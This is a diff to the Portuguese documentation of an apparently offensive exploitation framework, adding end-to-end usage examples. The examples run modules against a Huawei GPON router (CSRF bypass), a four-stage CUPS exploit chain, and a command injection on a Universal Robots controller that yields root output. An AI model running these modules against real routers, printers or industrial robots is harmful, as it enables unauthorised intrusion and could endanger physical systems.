@@ -39,9 +39,9 @@ Galeria PNG. Fontes Mermaid: [../../diagrams/architecture/README.md](../../diagr
 | [11-troubleshooting.md](11-troubleshooting.md) | Falhas comuns e correções |
 | [Anexo: índice de módulos](../ANEXO-INDICE-MODULOS.md) | Lista completa de caminhos de módulos |
 
-## Exemplo ponta a ponta (entrada e saída esperada)
+## Exemplos ponta a ponta (entrada e saida esperada)
 
-Entrada:
+### Exploit de roteador (Huawei GPON ONT)
 
 ```text
 exf > use exploits/routers/huawei/eg8145x6_info_disclosure
@@ -50,26 +50,71 @@ exf (EG8145X6 Info Disclosure) > check
 exf (EG8145X6 Info Disclosure) > run
 ```
 
-Saída esperada (exemplo):
+Saida esperada:
 
 ```text
-[+] Target appears vulnerable
-[*] Collecting metadata...
+[+] Target is a Huawei GPON ONT - extracting metadata
 [+] ProductName: EG8145X6-10
-[+] APPVersion: ...
+[+] APPVersion: 1.1.1.1
+[+] BuildTimestamp: 202410241935450553184798
+[*] CSRF token (estatico): 9b41cc4ca5587e32228a6a593a18806d...
+[+] getRandString ESTATICO? SIM - CSRF BYPASS POSSIVEL
 ```
 
-Entrada em modo automação:
+### Exploit de impressora (CUPS Pwn2Own 2026)
+
+```text
+exf > use exploits/printers/linux/cups_pwn2own_chain_cve_2026_34480
+exf (CUPS Pwn2Own Chain) > set target 192.168.1.10
+exf (CUPS Pwn2Own Chain) > set delay 2
+exf (CUPS Pwn2Own Chain) > run
+```
+
+Saida esperada:
+
+```text
+[*] CUPS Pwn2Own 2026 - Chain Completa (CVE-2026-34480)
+[+] CUPS IPP acessivel em 192.168.1.10:631
+[*] [Stage 1/4] CVE-2026-34477 (cups-browsed UAF)
+[+] Stage 1 completo: crash/UAF detectado
+[*] [Stage 2/4] CVE-2026-34478 (heap spray)
+[+] Stage 2 completo: 32/32 requisicoes aceitas
+[*] [Stage 3/4] CVE-2026-34479 (ROP chain LPE)
+[+] Stage 3 completo: ROP chain entregue
+[+] CUPS nao responde mais - chain executada
+```
+
+### Exploit ICS (Universal Robots)
+
+```text
+exf > use exploits/ics/ur_polyscope5_dashboard_cmd_injection_cve_2026_8153
+exf (UR PolyScope5) > set target 10.0.1.5
+exf (UR PolyScope5) > set cmd "id"
+exf (UR PolyScope5) > run
+```
+
+Saida esperada:
+
+```text
+[*] Conectando ao Dashboard PolyScope em 10.0.1.5:29999
+[+] PolyScope Dashboard Server detectado
+[*] Tentando command injection (CVE-2026-8153)
+[+] Command injection confirmado!
+[+] Output: uid=0(root) gid=0(root) groups=0(root)
+```
+
+### Modo automacao
 
 ```bash
 python -m embedxpl -m exploits/routers/huawei/eg8145x6_info_disclosure -s target 192.168.18.1 -s port 80
 ```
 
-Saída esperada (exemplo):
+Saida esperada:
 
 ```text
 [*] Running module: exploits/routers/huawei/eg8145x6_info_disclosure
-[+] ...
+[+] ProductName: EG8145X6-10
+[+] APPVersion: 1.1.1.1
 ```
 
 ## Ver também
